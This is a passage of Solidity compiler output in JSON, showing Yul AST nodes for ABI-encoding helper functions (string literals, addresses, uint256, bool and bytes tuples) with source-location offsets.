{"name":"end","nodeType":"YulIdentifier","src":"7553:3:15"}]}]},"name":"abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"7346:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"7354:3:15","type":""}],"src":"7212:366:15"},{"body":{"nodeType":"YulBlock","src":"7730:220:15","statements":[{"nodeType":"YulAssignment","src":"7740:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7806:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7811:2:15","type":"","value":"37"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"7747:58:15"},"nodeType":"YulFunctionCall","src":"7747:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"7740:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7912:3:15"}],"functionName":{"name":"store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48","nodeType":"YulIdentifier","src":"7823:88:15"},"nodeType":"YulFunctionCall","src":"7823:93:15"},"nodeType":"YulExpressionStatement","src":"7823:93:15"},{"nodeType":"YulAssignment","src":"7925:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7936:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7941:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7932:3:15"},"nodeType":"YulFunctionCall","src":"7932:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"7925:3:15"}]}]},"name":"abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"7718:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"7726:3:15","type":""}],"src":"7584:366:15"},{"body":{"nodeType":"YulBlock","src":"8102:220:15","statements":[{"nodeType":"YulAssignment","src":"8112:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8178:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8183:2:15","type":"","value":"28"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"8119:58:15"},"nodeType":"YulFunctionCall","src":"8119:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"8112:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8284:3:15"}],"functionName":{"name":"store_literal_in_memory_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57","nodeType":"YulIdentifier","src":"8195:88:15"},"nodeType":"YulFunctionCall","src":"8195:93:15"},"nodeType":"YulExpressionStatement","src":"8195:93:15"},{"nodeType":"YulAssignment","src":"8297:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8308:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8313:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"8304:3:15"},"nodeType":"YulFunctionCall","src":"8304:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"8297:3:15"}]}]},"name":"abi_encode_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"8090:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"8098:3:15","type":""}],"src":"7956:366:15"},{"body":{"nodeType":"YulBlock","src":"8474:220:15","statements":[{"nodeType":"YulAssignment","src":"8484:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8550:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8555:2:15","type":"","value":"36"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"8491:58:15"},"nodeType":"YulFunctionCall","src":"8491:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"8484:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8656:3:15"}],"functionName":{"name":"store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4","nodeType":"YulIdentifier","src":"8567:88:15"},"nodeType":"YulFunctionCall","src":"8567:93:15"},"nodeType":"YulExpressionStatement","src":"8567:93:15"},{"nodeType":"YulAssignment","src":"8669:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8680:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8685:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"8676:3:15"},"nodeType":"YulFunctionCall","src":"8676:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"8669:3:15"}]}]},"name":"abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"8462:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"8470:3:15","type":""}],"src":"8328:366:15"},{"body":{"nodeType":"YulBlock","src":"8846:220:15","statements":[{"nodeType":"YulAssignment","src":"8856:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8922:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8927:2:15","type":"","value":"25"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"8863:58:15"},"nodeType":"YulFunctionCall","src":"8863:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"8856:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9028:3:15"}],"functionName":{"name":"store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05","nodeType":"YulIdentifier","src":"8939:88:15"},"nodeType":"YulFunctionCall","src":"8939:93:15"},"nodeType":"YulExpressionStatement","src":"8939:93:15"},{"nodeType":"YulAssignment","src":"9041:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9052:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9057:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9048:3:15"},"nodeType":"YulFunctionCall","src":"9048:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"9041:3:15"}]}]},"name":"abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"8834:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"8842:3:15","type":""}],"src":"8700:366:15"},{"body":{"nodeType":"YulBlock","src":"9218:220:15","statements":[{"nodeType":"YulAssignment","src":"9228:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9294:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9299:2:15","type":"","value":"41"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"9235:58:15"},"nodeType":"YulFunctionCall","src":"9235:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"9228:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9400:3:15"}],"functionName":{"name":"store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159","nodeType":"YulIdentifier","src":"9311:88:15"},"nodeType":"YulFunctionCall","src":"9311:93:15"},"nodeType":"YulExpressionStatement","src":"9311:93:15"},{"nodeType":"YulAssignment","src":"9413:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9424:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9429:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9420:3:15"},"nodeType":"YulFunctionCall","src":"9420:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"9413:3:15"}]}]},"name":"abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"9206:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"9214:3:15","type":""}],"src":"9072:366:15"},{"body":{"nodeType":"YulBlock","src":"9590:220:15","statements":[{"nodeType":"YulAssignment","src":"9600:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9666:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9671:2:15","type":"","value":"32"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"9607:58:15"},"nodeType":"YulFunctionCall","src":"9607:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"9600:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9772:3:15"}],"functionName":{"name":"store_literal_in_memory_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6","nodeType":"YulIdentifier","src":"9683:88:15"},"nodeType":"YulFunctionCall","src":"9683:93:15"},"nodeType":"YulExpressionStatement","src":"9683:93:15"},{"nodeType":"YulAssignment","src":"9785:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9796:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9801:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9792:3:15"},"nodeType":"YulFunctionCall","src":"9792:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"9785:3:15"}]}]},"name":"abi_encode_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"9578:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"9586:3:15","type":""}],"src":"9444:366:15"},{"body":{"nodeType":"YulBlock","src":"9962:220:15","statements":[{"nodeType":"YulAssignment","src":"9972:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10038:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10043:2:15","type":"","value":"24"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"9979:58:15"},"nodeType":"YulFunctionCall","src":"9979:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"9972:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10144:3:15"}],"functionName":{"name":"store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f","nodeType":"YulIdentifier","src":"10055:88:15"},"nodeType":"YulFunctionCall","src":"10055:93:15"},"nodeType":"YulExpressionStatement","src":"10055:93:15"},{"nodeType":"YulAssignment","src":"10157:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10168:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10173:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"10164:3:15"},"nodeType":"YulFunctionCall","src":"10164:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"10157:3:15"}]}]},"name":"abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"9950:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"9958:3:15","type":""}],"src":"9816:366:15"},{"body":{"nodeType":"YulBlock","src":"10334:220:15","statements":[{"nodeType":"YulAssignment","src":"10344:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10410:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10415:2:15","type":"","value":"33"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"10351:58:15"},"nodeType":"YulFunctionCall","src":"10351:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"10344:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10516:3:15"}],"functionName":{"name":"store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942","nodeType":"YulIdentifier","src":"10427:88:15"},"nodeType":"YulFunctionCall","src":"10427:93:15"},"nodeType":"YulExpressionStatement","src":"10427:93:15"},{"nodeType":"YulAssignment","src":"10529:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10540:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10545:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"10536:3:15"},"nodeType":"YulFunctionCall","src":"10536:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"10529:3:15"}]}]},"name":"abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"10322:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"10330:3:15","type":""}],"src":"10188:366:15"},{"body":{"nodeType":"YulBlock","src":"10706:220:15","statements":[{"nodeType":"YulAssignment","src":"10716:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10782:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10787:2:15","type":"","value":"61"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"10723:58:15"},"nodeType":"YulFunctionCall","src":"10723:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"10716:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10888:3:15"}],"functionName":{"name":"store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83","nodeType":"YulIdentifier","src":"10799:88:15"},"nodeType":"YulFunctionCall","src":"10799:93:15"},"nodeType":"YulExpressionStatement","src":"10799:93:15"},{"nodeType":"YulAssignment","src":"10901:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10912:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10917:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"10908:3:15"},"nodeType":"YulFunctionCall","src":"10908:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"10901:3:15"}]}]},"name":"abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"10694:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"10702:3:15","type":""}],"src":"10560:366:15"},{"body":{"nodeType":"YulBlock","src":"11078:220:15","statements":[{"nodeType":"YulAssignment","src":"11088:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"11154:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"11159:2:15","type":"","value":"48"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"11095:58:15"},"nodeType":"YulFunctionCall","src":"11095:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"11088:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"11260:3:15"}],"functionName":{"name":"store_literal_in_memory_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a","nodeType":"YulIdentifier","src":"11171:88:15"},"nodeType":"YulFunctionCall","src":"11171:93:15"},"nodeType":"YulExpressionStatement","src":"11171:93:15"},{"nodeType":"YulAssignment","src":"11273:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"11284:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"11289:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11280:3:15"},"nodeType":"YulFunctionCall","src":"11280:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"11273:3:15"}]}]},"name":"abi_encode_t_stringliteral_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"11066:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"11074:3:15","type":""}],"src":"10932:366:15"},{"body":{"nodeType":"YulBlock","src":"11369:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"11386:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"11409:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"11391:17:15"},"nodeType":"YulFunctionCall","src":"11391:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"11379:6:15"},"nodeType":"YulFunctionCall","src":"11379:37:15"},"nodeType":"YulExpressionStatement","src":"11379:37:15"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"11357:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"11364:3:15","type":""}],"src":"11304:118:15"},{"body":{"nodeType":"YulBlock","src":"11526:124:15","statements":[{"nodeType":"YulAssignment","src":"11536:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11548:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11559:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11544:3:15"},"nodeType":"YulFunctionCall","src":"11544:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"11536:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"11616:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11629:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11640:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11625:3:15"},"nodeType":"YulFunctionCall","src":"11625:17:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"11572:43:15"},"nodeType":"YulFunctionCall","src":"11572:71:15"},"nodeType":"YulExpressionStatement","src":"11572:71:15"}]},"name":"abi_encode_tuple_t_address__to_t_address__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"11498:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"11510:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"11521:4:15","type":""}],"src":"11428:222:15"},{"body":{"nodeType":"YulBlock","src":"11856:440:15","statements":[{"nodeType":"YulAssignment","src":"11866:27:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11878:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11889:3:15","type":"","value":"128"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11874:3:15"},"nodeType":"YulFunctionCall","src":"11874:19:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"11866:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"11947:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"11960:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"11971:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"11956:3:15"},"nodeType":"YulFunctionCall","src":"11956:17:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"11903:43:15"},"nodeType":"YulFunctionCall","src":"11903:71:15"},"nodeType":"YulExpressionStatement","src":"11903:71:15"},{"expression":{"arguments":[{"name":"value1","nodeType":"YulIdentifier","src":"12028:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12041:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12052:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12037:3:15"},"nodeType":"YulFunctionCall","src":"12037:18:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulIdentifier","src":"11984:43:15"},"nodeType":"YulFunctionCall","src":"11984:72:15"},"nodeType":"YulExpressionStatement","src":"11984:72:15"},{"expression":{"arguments":[{"name":"value2","nodeType":"YulIdentifier","src":"12110:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12123:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12134:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12119:3:15"},"nodeType":"YulFunctionCall","src":"12119:18:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"12066:43:15"},"nodeType":"YulFunctionCall","src":"12066:72:15"},"nodeType":"YulExpressionStatement","src":"12066:72:15"},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12159:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12170:2:15","type":"","value":"96"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12155:3:15"},"nodeType":"YulFunctionCall","src":"12155:18:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"12179:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"12185:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"12175:3:15"},"nodeType":"YulFunctionCall","src":"12175:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"12148:6:15"},"nodeType":"YulFunctionCall","src":"12148:48:15"},"nodeType":"YulExpressionStatement","src":"12148:48:15"},{"nodeType":"YulAssignment","src":"12205:84:15","value":{"arguments":[{"name":"value3","nodeType":"YulIdentifier","src":"12275:6:15"},{"name":"tail","nodeType":"YulIdentifier","src":"12284:4:15"}],"functionName":{"name":"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"12213:61:15"},"nodeType":"YulFunctionCall","src":"12213:76:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12205:4:15"}]}]},"name":"abi_encode_tuple_t_address_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_address_t_uint256_t_bytes_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"11804:9:15","type":""},{"name":"value3","nodeType":"YulTypedName","src":"11816:6:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"11824:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"11832:6:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"11840:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"11851:4:15","type":""}],"src":"11656:640:15"},{"body":{"nodeType":"YulBlock","src":"12394:118:15","statements":[{"nodeType":"YulAssignment","src":"12404:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12416:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12427:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12412:3:15"},"nodeType":"YulFunctionCall","src":"12412:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12404:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"12478:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12491:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12502:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12487:3:15"},"nodeType":"YulFunctionCall","src":"12487:17:15"}],"functionName":{"name":"abi_encode_t_bool_to_t_bool_fromStack","nodeType":"YulIdentifier","src":"12440:37:15"},"nodeType":"YulFunctionCall","src":"12440:65:15"},"nodeType":"YulExpressionStatement","src":"12440:65:15"}]},"name":"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"12366:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"12378:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"12389:4:15","type":""}],"src":"12302:210:15"},{"body":{"nodeType":"YulBlock","src":"12636:195:15","statements":[{"nodeType":"YulAssignment","src":"12646:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12658:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12669:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12654:3:15"},"nodeType":"YulFunctionCall","src":"12654:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12646:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"12693:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"12704:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"12689:3:15"},"nodeType":"YulFunctionCall","src":"12689:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"12712:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"12718:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"12708:3:15"},"nodeType":"YulFunctionCall","src":"12708:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"12682:6:15"},"nodeType":"YulFunctionCall","src":"12682:47:15"},"nodeType":"YulExpressionStatement","src":"12682:47:15"},{"nodeType":"YulAssignment","src":"12738:86:15","value":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"12810:6:15"},{"name":"tail","nodeType":"YulIdentifier","src":"12819:4:15"}],"functionName":{"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"12746:63:15"},"nodeType":"YulFunctionCall","src":"12746:78:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"12738:4:15"}]}]},"name":"abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"12608:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"12620:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"12631:4:15","type":""}],"src":"12518:313:15"},{"body":{"nodeType":"YulBlock","src":"13008:248:15","statements":[{"nodeType":"YulAssignment","src":"13018:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13030:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13041:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13026:3:15"},"nodeType":"YulFunctionCall","src":"13026:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13018:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13065:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13076:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13061:3:15"},"nodeType":"YulFunctionCall","src":"13061:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13084:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"13090:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"13080:3:15"},"nodeType":"YulFunctionCall","src":"13080:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"13054:6:15"},"nodeType":"YulFunctionCall","src":"13054:47:15"},"nodeType":"YulExpressionStatement","src":"13054:47:15"},{"nodeType":"YulAssignment","src":"13110:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13244:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"13118:124:15"},"nodeType":"YulFunctionCall","src":"13118:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13110:4:15"}]}]},"name":